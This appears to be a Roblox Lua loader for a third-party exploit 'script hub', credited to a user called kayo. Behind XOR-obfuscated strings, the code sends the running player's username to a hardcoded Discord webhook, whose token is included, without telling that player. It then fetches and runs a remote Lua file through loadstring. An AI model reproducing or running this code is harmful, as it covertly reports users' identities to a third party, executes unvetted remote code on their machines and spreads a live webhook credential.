--[[
by kayo (luc1d#2594)
]]--

--[[
by kayo (luc1d#2594)
]]--


local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v15,v16)local v17={};for v18=1, #v15 do v6(v17,v0(v4(v1(v2(v15,v18,v18 + 1 )),v1(v2(v16,1 + ((v18-1)% #v16) ,1 + ((v18-1)% #v16) + 1 )))%256 ));end return v5(v17);end local v8="https://discord.com/api/webhooks/1098733447297642546/afL3w2DeqPVvuZ-NyMZ6nSt5OXb4Zwz8X03dwj4xPvcB6W3RYM33kyz-ptFi12NJziIB";local v9=game:GetService(v7("\116\126\121\82\39\252\1","\36\18\24\43\66\142\114\210")).LocalPlayer;local v10={[v7("\196\70\222\162\63\50\88","\167\41\176\214\90\92\44\199")]="olá <@753764583394508820> eu sou "   .. v9.Name ,[v7("\188\63\169\84\73\64\141\168\59\164","\221\73\200\32\40\50\210")]="https://cdn.discordapp.com/attachments/1007966867656294400/1012432494383075329/unknown.png"};local v11=game:GetService(v7("\44\101\76\164\225\55\220\19\13\114\93","\100\17\56\212\178\82\174\101")):JSONEncode(v10);local v12={[v7("\113\253\3\188\222\56\102\191\25\177\203\51","\18\146\109\200\187\86")]="application/json"};request=http_request or request or HttpPost or syn.request ;local v13={[v7("\41\236\122","\124\158\22\51\36\218\163")]=v8,[v7("\237\20\162\162","\175\123\198\219\202\76\163")]=v11,[v7("\4\6\35\30\10\191","\73\99\87\118\101\219")]=v7("\100\7\105\12","\52\72\58\88\187"),[v7("\194\52\93\220\82\248\34","\138\81\60\184\55")]=v12};request(v13);local v14=loadstring(game:HttpGet("https://raw.githubusercontent.com/onlykayo/KayHub-by-kayo/main/mainn.lua"))();
